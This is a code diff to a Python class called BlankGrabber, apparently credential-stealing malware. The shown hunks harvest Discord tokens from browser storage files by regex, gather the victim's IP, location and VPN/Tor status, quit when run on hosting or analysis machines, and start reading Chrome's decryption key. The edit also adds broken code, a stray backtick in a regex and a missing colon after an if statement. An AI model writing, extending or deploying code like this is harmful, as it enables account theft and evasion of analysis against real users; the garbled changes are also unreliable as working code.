@@ -198,7 +198,7 @@ class BlankGrabber:
                 if not filename.endswith('.log') and not filename.endswith('.ldb'):
                     continue
                 for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:
-                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for reg in (r"[\w-]{`24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                         for token in re.findall(reg, line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
@@ -272,23 +272,31 @@ class BlankGrabber:
         return headers
 
     def getip(self):
-        headers = {'referer': 'https://ipinfo.io/'}
+        try:
+            ip = requests.get('https://utilities.tk/network/info').json()['ip']
+        except:
+            ip = None
         for i in range(5):
-            i = requests.get('https://ipinfo.io/widget', headers=headers)
+            i = requests.get('https://ipinfo.io/widget', headers={'referer': 'https://ipinfo.io/'})
             if i.status_code==200:
                 break
         try:
             r = i.json()
         except Exception:
-            r = requests.get('https://httpbin.org/get').text
-            return f"IP: {r.json().get('origin')}"
+            if ip == None
+                r = requests.get('https://httpbin.org/get').text
+                return f"IP: {r.json().get('origin')}"
+            else:
+                pass
         if r['privacy'].get('hosting', False):
             os._exit(0)
         try:
             p = requests.get('https://blank-c.github.io/country-codes.json').json()
         except Exception:
             p = {}
-        return  f"IP: {r['ip']}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {chr(9989) if r['privacy']['vpn'] else chr(10062)}\n{'Proxy:'.ljust(6)} {chr(9989) if r['privacy']['proxy'] else chr(10062)}\n{'Tor:'.ljust(6)} {chr(9989) if r['privacy']['tor'] else chr(10062)}\n{'Relay:'.ljust(6)} {chr(9989) if r['privacy']['relay'] else chr(10062)}"
+        if ip == None:
+            ip = r['ip']
+        return  f"IP: {ip}\nRegion: {r['region']}\nCountry: {p.get(r['country'], r['country'])}\nTimezone: {r['timezone']}\n\n{'VPN:'.ljust(6)} {chr(9989) if r['privacy']['vpn'] else chr(10062)}\n{'Proxy:'.ljust(6)} {chr(9989) if r['privacy']['proxy'] else chr(10062)}\n{'Tor:'.ljust(6)} {chr(9989) if r['privacy']['tor'] else chr(10062)}\n{'Relay:'.ljust(6)} {chr(9989) if r['privacy']['relay'] else chr(10062)}"
 
     def get_decryption_key(self):
         key = self.chromefolder+"/Local State"
